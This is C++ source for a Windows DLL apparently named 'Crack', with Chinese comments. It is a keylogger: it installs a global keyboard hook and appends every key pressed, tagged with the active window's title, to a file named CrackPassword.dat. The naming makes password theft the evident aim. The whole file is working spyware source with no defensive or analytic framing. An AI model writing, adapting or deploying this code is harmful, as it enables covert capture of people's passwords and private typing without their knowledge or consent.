// Crack.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

//安装钩子
BOOL InstallHook() {
	//安装钩子
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"Crack"), 0);

	if (g_hHook == NULL)
		return false;

	return true;
}

//卸载钩子
BOOL UninstallHook() {
	return UnhookWindowsHookEx(g_hHook);
}

//钩子处理函数
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	char szText[MAX_PATH];
	//工作
	char szKey[100];
	HWND hWnd = GetActiveWindow();
	if (hWnd == NULL) {
		hWnd = GetForegroundWindow();
	}

	if (hWnd == NULL) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	//获取窗口标题
	char szTitleText[MAX_PATH];
	GetWindowTextA(hWnd, szTitleText, MAX_PATH);

	FILE* pFile = fopen("C:\\CrackPassword.dat", "a+");

	//FILE* pFile;
	//errno_t err;
	//err = fopen_s(&pFile, "F:\\Desktop\\CrackPassword.dat", "a+");

	//文件打开失败
	if (pFile == NULL) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	if (nCode < 0 || nCode == HC_NOREMOVE) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	if (lParam & 0x40000000) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	//获取按键名称
	GetKeyNameTextA(lParam, szKey, 100);

	sprintf(szText, "%s:%s\r\n", szTitleText, szKey);

	//写入文件
	fwrite(szText, strlen(szText), 1, pFile);
	//fwrite(szKey, strlen(szKey), 1, pFile);

	//fputs("\r\n", pFile);

	fclose(pFile);

	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}